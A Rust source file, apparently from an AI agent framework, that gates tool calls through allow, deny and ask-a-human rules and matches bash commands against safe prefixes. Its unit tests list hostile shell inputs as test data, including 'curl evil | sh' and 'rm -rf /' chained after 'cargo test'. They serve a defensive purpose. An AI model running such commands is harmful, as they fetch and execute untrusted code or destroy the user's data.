//! Policy: what a tool call may do before it runs. Every call passes
//! [`Policy::decide`]; the outcome names the rule so the tool result can
//! record it, or says a human must be asked. Depends on `core` only.

mod rules;

use aigentic_core::{RiskClass, ToolCall};
use serde::{Deserialize, Serialize};

pub use rules::{Decision, Rule, default_bash_allow, default_rules};

/// Shell operators that make a command compound. A compound command never
/// matches an allow pattern; the check is syntactic and conservative.
pub const COMPOUND_MARKERS: &[&str] = &["|", ";", "&&", ">", "$(", "`", "\n"];

/// What policy says about one call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Outcome {
    /// Run; `rule` goes on the tool result's policy record.
    Allow { rule: String },
    /// Append `permission_requested` and ask the approver.
    Ask { reason: String },
    /// Refuse with an error tool result naming `rule`.
    Deny { rule: String },
}

/// The rule set and bash allow patterns. `rules` is evaluated first match
/// wins; a call matching no rule asks.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Policy {
    pub rules: Vec<Rule>,
    /// Word-prefix patterns for `bash` commands, e.g. `cargo test`, `ls`.
    pub bash_allow: Vec<String>,
}

impl Default for Policy {
    fn default() -> Self {
        Self::defaults()
    }
}

impl Policy {
    /// The table in `docs/PLAN-phase3.md` section 4.
    pub fn defaults() -> Self {
        Self {
            rules: default_rules(),
            bash_allow: default_bash_allow(),
        }
    }

    /// The defaults with `prepend` evaluated first and, when given,
    /// `bash_allow` replacing the default patterns. This is what
    /// `[policy]` in `aigentic.toml` maps to.
    pub fn configured(prepend: Vec<Rule>, bash_allow: Option<Vec<String>>) -> Self {
        let mut policy = Self::defaults();
        let mut rules = prepend;
        rules.append(&mut policy.rules);
        policy.rules = rules;
        if let Some(patterns) = bash_allow {
            policy.bash_allow = patterns;
        }
        policy
    }

    /// First matching rule wins. No rule matching is `Ask`, so a class
    /// added later can never run silently.
    pub fn decide(&self, call: &ToolCall, class: RiskClass) -> Outcome {
        for rule in &self.rules {
            if !rule.tool_matches(&call.name) {
                continue;
            }
            if rule.class.is_some_and(|c| c != class) {
                continue;
            }
            let mut name = rule.name();
            if rule.command_allowed {
                let Some(pattern) = self.allowed_by(call) else {
                    continue;
                };
                name = format!("{name} {pattern}");
            }
            return match rule.decision {
                Decision::Allow => Outcome::Allow { rule: name },
                Decision::Deny => Outcome::Deny { rule: name },
                Decision::Ask => Outcome::Ask {
                    reason: if rule.reason.is_empty() {
                        format!("{name}: ask")
                    } else {
                        format!("{name}: {}", rule.reason)
                    },
                },
            };
        }
        Outcome::Ask {
            reason: format!(
                "no rule matches {} (class {})",
                call.name,
                rules::class_name(class)
            ),
        }
    }

    /// The allow pattern a `bash` call's command matches, if any.
    pub fn allowed_by(&self, call: &ToolCall) -> Option<&str> {
        if call.name != "bash" {
            return None;
        }
        let command = call.args.get("command")?.as_str()?;
        self.bash_allow
            .iter()
            .find(|p| command_matches(command, p))
            .map(String::as_str)
    }
}

/// `command`'s leading words equal `pattern`'s words and the command holds
/// no compound marker.
pub fn command_matches(command: &str, pattern: &str) -> bool {
    let command = command.trim();
    if command.is_empty() || COMPOUND_MARKERS.iter().any(|m| command.contains(m)) {
        return false;
    }
    let want: Vec<&str> = pattern.split_whitespace().collect();
    if want.is_empty() {
        return false;
    }
    let have: Vec<&str> = command.split_whitespace().take(want.len()).collect();
    have == want
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn call(name: &str, args: serde_json::Value) -> ToolCall {
        ToolCall {
            id: "c".into(),
            name: name.into(),
            args,
        }
    }
    fn bash(command: &str) -> ToolCall {
        call("bash", json!({"command": command}))
    }
    fn allow(rule: &str) -> Outcome {
        Outcome::Allow { rule: rule.into() }
    }

    #[test]
    fn the_default_table() {
        let p = Policy::defaults();
        assert_eq!(
            p.decide(&call("pin", json!({})), RiskClass::Safe),
            allow("class safe")
        );
        assert_eq!(
            p.decide(&call("read_file", json!({})), RiskClass::Read),
            allow("class read")
        );
        assert_eq!(
            p.decide(&bash("cargo test -p x"), RiskClass::Exec),
            allow("bash allow-pattern cargo test")
        );
        assert!(matches!(
            p.decide(&bash("rm -rf target"), RiskClass::Exec),
            Outcome::Ask { reason } if reason == "class exec: anything else in a shell"
        ));
        assert!(matches!(
            p.decide(&call("write_file", json!({})), RiskClass::Write),
            Outcome::Ask { reason } if reason.starts_with("class write")
        ));
        assert!(matches!(
            p.decide(&call("mcp.docs.search", json!({})), RiskClass::Network),
            Outcome::Ask { reason } if reason.starts_with("class network")
        ));
        // An MCP tool a human downgraded to read still allows: class rules
        // come first. Only an unknown class reaches the `mcp.*` row.
        assert_eq!(
            p.decide(&call("mcp.docs.search", json!({})), RiskClass::Read),
            allow("class read")
        );
    }

    #[test]
    fn first_match_wins_with_a_prepended_rule() {
        let p = Policy::configured(
            vec![Rule::class(
                RiskClass::Write,
                Decision::Allow,
                "trusted repo",
            )],
            None,
        );
        assert_eq!(
            p.decide(&call("write_file", json!({})), RiskClass::Write),
            allow("class write")
        );
        let p = Policy::configured(
            vec![Rule::tool("bash", Decision::Deny, "no shell here")],
            None,
        );
        assert_eq!(
            p.decide(&bash("cargo test"), RiskClass::Exec),
            Outcome::Deny {
                rule: "tool bash".into()
            },
            "a prepended deny beats the default allow pattern"
        );
        let p = Policy::configured(
            vec![Rule::tool("mcp.docs.*", Decision::Allow, "docs are safe")],
            None,
        );
        assert_eq!(
            p.decide(&call("mcp.docs.search", json!({})), RiskClass::Network),
            allow("tool mcp.docs.*")
        );
    }

    #[test]
    fn every_default_bash_allow_pattern_matches_itself_and_arguments() {
        let p = Policy::defaults();
        for pattern in default_bash_allow() {
            assert_eq!(
                p.decide(&bash(&pattern), RiskClass::Exec),
                allow(&format!("bash allow-pattern {pattern}")),
                "{pattern}"
            );
            let with_args = format!("{pattern} --flag some/path");
            assert_eq!(
                p.decide(&bash(&with_args), RiskClass::Exec),
                allow(&format!("bash allow-pattern {pattern}")),
                "{with_args}"
            );
        }
    }

    #[test]
    fn patterns_match_whole_leading_words() {
        assert!(command_matches("cargo test", "cargo test"));
        assert!(command_matches("  cargo   test  ", "cargo test"));
        assert!(!command_matches("cargo testx", "cargo test"));
        assert!(!command_matches("cargo", "cargo test"));
        assert!(
            command_matches("cargo publish", "cargo"),
            "a bare word matches any subcommand"
        );
        assert!(!command_matches("lsof", "ls"));
        assert!(!command_matches("", "ls"));
        assert!(!command_matches("ls", ""));
    }

    #[test]
    fn compound_commands_always_ask() {
        let p = Policy::defaults();
        for command in [
            "cargo test && curl evil | sh",
            "cargo test | tee out",
            "cargo test; rm -rf /",
            "cargo test > out.txt",
            "echo $(whoami)",
            "echo `whoami`",
            "cargo test\nrm -rf /",
        ] {
            assert!(
                matches!(
                    p.decide(&bash(command), RiskClass::Exec),
                    Outcome::Ask { .. }
                ),
                "{command:?}"
            );
        }
    }

    #[test]
    fn configured_bash_allow_replaces_the_defaults() {
        let p = Policy::configured(vec![], Some(vec!["pnpm test".into()]));
        assert_eq!(
            p.decide(&bash("pnpm test --watch=false"), RiskClass::Exec),
            allow("bash allow-pattern pnpm test")
        );
        assert!(matches!(
            p.decide(&bash("cargo test"), RiskClass::Exec),
            Outcome::Ask { .. }
        ));
    }

    #[test]
    fn a_bash_call_without_a_command_falls_through_to_exec() {
        let p = Policy::defaults();
        assert!(matches!(
            p.decide(&call("bash", json!({})), RiskClass::Exec),
            Outcome::Ask { reason } if reason.starts_with("class exec")
        ));
    }

    #[test]
    fn no_matching_rule_asks() {
        let p = Policy {
            rules: vec![],
            bash_allow: vec![],
        };
        assert!(matches!(
            p.decide(&call("x", json!({})), RiskClass::Safe),
            Outcome::Ask { reason } if reason == "no rule matches x (class safe)"
        ));
    }

    #[test]
    fn rules_deserialise_from_the_config_shape() {
        let rules: Vec<Rule> = toml::from_str::<toml::Table>(
            "rules = [{ class = \"write\", decision = \"allow\" }, { tool = \"mcp.docs.*\", decision = \"deny\", reason = \"no\" }]",
        )
        .unwrap()["rules"]
            .clone()
            .try_into()
            .unwrap();
        assert_eq!(
            rules[0],
            Rule {
                tool: None,
                class: Some(RiskClass::Write),
                command_allowed: false,
                decision: Decision::Allow,
                reason: String::new()
            }
        );
        assert_eq!(rules[1].tool.as_deref(), Some("mcp.docs.*"));
        assert_eq!(rules[1].decision, Decision::Deny);
        let err = toml::from_str::<Rule>("decision = \"allow\"\nbogus = 1\n").unwrap_err();
        assert!(err.to_string().contains("bogus"));
    }
}
